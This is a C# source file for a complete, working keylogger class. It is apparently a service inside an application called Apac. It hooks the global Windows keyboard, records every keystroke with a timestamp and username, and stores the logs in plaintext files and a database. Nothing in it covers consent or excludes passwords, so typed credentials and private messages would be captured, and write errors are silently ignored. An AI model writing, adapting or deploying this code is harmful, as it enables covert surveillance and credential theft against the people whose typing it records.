using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Apac.Database;

namespace Apac.Services
{
    public class KeyLogger : IDisposable
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;

        private IntPtr _hookId = IntPtr.Zero;
        private LowLevelKeyboardProc _proc;
        private volatile bool _running;
        private readonly int _userId;
        private readonly string _username;
        private string _logFilePath;
        private readonly object _fileLock = new object();
        private readonly StringBuilder _buffer = new StringBuilder();
        private readonly System.Threading.Timer _flushTimer;

        public KeyLogger(int userId, string username)
        {
            _userId = userId;
            _username = username;
            _proc = HookCallback;
            InitializeLogFile();

            _flushTimer = new System.Threading.Timer(_ => FlushBuffer(), null, 5000, 5000);
        }

        private void InitializeLogFile()
        {
            string basePath = DatabaseManager.Instance.GetSetting("keylogger_path", @"Logs\Keylogs");
            Directory.CreateDirectory(basePath);

            string mode = DatabaseManager.Instance.GetSetting("keylogger_mode", "daily");
            string datePart = mode == "session"
                ? DateTime.Now.ToString("yyyyMMdd_HHmmss")
                : DateTime.Now.ToString("yyyyMMdd");

            _logFilePath = Path.Combine(basePath, $"keylog_{datePart}_{_username}.txt");
        }

        public void Start()
        {
            if (_running) return;
            _running = true;
            _hookId = SetHook(_proc);
        }

        public void Stop()
        {
            _running = false;
            FlushBuffer();
            _flushTimer?.Dispose();
            if (_hookId != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookId);
                _hookId = IntPtr.Zero;
            }
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (!_running) return CallNextHookEx(_hookId, nCode, wParam, lParam);

            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string keyText = GetKeyText(vkCode);
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

                lock (_fileLock)
                {
                    _buffer.AppendLine($"[{timestamp}] {_username}: {keyText}");
                }

                DatabaseManager.Instance.AddLogEntry("Keylog", _userId, _logFilePath, keyText);
            }

            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private void FlushBuffer()
        {
            string text;
            lock (_fileLock)
            {
                if (_buffer.Length == 0) return;
                text = _buffer.ToString();
                _buffer.Clear();
            }

            try
            {
                File.AppendAllText(_logFilePath, text);
            }
            catch
            {
            }
        }

        private string GetKeyText(int vkCode)
        {
            bool shift = (GetAsyncKeyState(0x10) & 0x8000) != 0;
            bool ctrl = (GetAsyncKeyState(0x11) & 0x8000) != 0;
            bool alt = (GetAsyncKeyState(0x12) & 0x8000) != 0;

            if (ctrl && vkCode >= 0x41 && vkCode <= 0x5A)
                return $"[CTRL+{(char)('A' + (vkCode - 0x41))}]";
            if (alt && vkCode >= 0x41 && vkCode <= 0x5A)
                return $"[ALT+{(char)('A' + (vkCode - 0x41))}]";

            switch (vkCode)
            {
                case 0x0D: return "[ENTER]";
                case 0x08: return "[BACKSPACE]";
                case 0x09: return "[TAB]";
                case 0x1B: return "[ESC]";
                case 0x20: return " ";
                case 0x25: return "[LEFT]";
                case 0x26: return "[UP]";
                case 0x27: return "[RIGHT]";
                case 0x28: return "[DOWN]";
                case 0x2E: return "[DELETE]";
                case 0x70: return "[F1]";
                case 0x71: return "[F2]";
                case 0x72: return "[F3]";
                case 0x73: return "[F4]";
                case 0x74: return "[F5]";
                case 0x75: return "[F6]";
                case 0x76: return "[F7]";
                case 0x77: return "[F8]";
                case 0x78: return "[F9]";
                case 0x79: return "[F10]";
                case 0x7A: return "[F11]";
                case 0x7B: return "[F12]";
                case 0x5B: return "[WIN]";
                case 0x2C: return "[PRINTSCREEN]";
                case 0x13: return "[PAUSE]";
                case 0x2D: return "[INSERT]";
                case 0x24: return "[HOME]";
                case 0x23: return "[END]";
                case 0x21: return "[PAGEUP]";
                case 0x22: return "[PAGEDOWN]";
                case 0x90: return "[NUMLOCK]";
                case 0x14: return "[CAPSLOCK]";
                case 0x91: return "[SCROLLLOCK]";
                default:
                    try
                    {
                        Keys key = (Keys)vkCode;
                        string s = key.ToString();
                        if (s.Length == 1) return s.ToLower();
                        if (s.StartsWith("D") && s.Length == 2) return s[1].ToString();
                        return $"[{s}]";
                    }
                    catch
                    {
                        return $"[{vkCode}]";
                    }
            }
        }

        private enum Keys
        {
            D0 = 48, D1 = 49, D2 = 50, D3 = 51, D4 = 52,
            D5 = 53, D6 = 54, D7 = 55, D8 = 56, D9 = 57,
            A = 65, B = 66, C = 67, D = 68, E = 69,
            F = 70, G = 71, H = 72, I = 73, J = 74,
            K = 75, L = 76, M = 77, N = 78, O = 79,
            P = 80, Q = 81, R = 82, S = 83, T = 84,
            U = 85, V = 86, W = 87, X = 88, Y = 89, Z = 90,
            OemMinus = 189, OemPlus = 187, OemOpenBrackets = 219,
            OemCloseBrackets = 221, OemPipe = 220, OemSemicolon = 186,
            OemQuotes = 222, OemComma = 188, OemPeriod = 190,
            OemQuestion = 191, OemTilde = 192
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
            IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        public void Dispose()
        {
            Stop();
        }
    }
}
